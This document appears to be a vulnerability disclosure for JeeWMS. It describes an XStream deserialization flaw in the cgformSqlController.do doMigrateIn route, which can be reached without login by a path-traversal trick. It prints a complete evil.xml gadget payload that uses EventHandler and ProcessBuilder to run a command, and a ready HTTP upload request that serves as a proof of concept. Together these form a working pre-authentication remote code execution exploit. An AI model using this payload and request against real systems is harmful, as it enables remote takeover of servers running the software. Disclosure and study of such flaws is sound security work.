**Vulnerability Description**: The `cgformSqlController.do` route in `JeeWMS` exhibits an `XStream` deserialization vulnerability, enabling remote execution of arbitrary code. When combined with unauthorized front-end access, it can achieve the effect of executing arbitrary code on the front-end.

**Vulnerability class**：`org/jeecgframework/web/cgform/controller/build/CgformSqlController.java`

**Method where the vulnerability lies**：`org.jeecgframework.web.cgform.controller.build.CgformSqlController#**doMigrateIn`



In the method, the uploaded `zip` archive is first decompressed, and the extracted `XML` file is directly deserialized using `XStream` without undergoing any security verification

![image-20250724115152772](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250724115152772.png?imageSlim)

The default dependency version of `XStream` is `1.4.4`

![image-20250724115614596](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250724115614596.png?imageSlim)

`evil.xml`

```XML
<tree-map>
    <entry>
        <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="java.beans.EventHandler">
                <target class="java.lang.ProcessBuilder">
                    <command>
                        <string>calc</string>
                    </command>
                </target>
                <action>start</action>
            </handler>
        </dynamic-proxy>
        <string>good</string>
    </entry>
</tree-map>
```

Vulnerability `POC`

```http
POST /jeewms/wmsApiController.do/../cgformSqlController.do?doMigrateIn HTTP/1.1
Host: 192.168.21.128:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: [xxx]

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="evil.zip"
Content-Type: application/zip

{{file(C:\\Users\\worker\\Desktop\\java\\evil.zip)}}

------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

![img](https://img-1325537595.cos.ap-beijing.myqcloud.com/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1753327815533.png?imageSlim)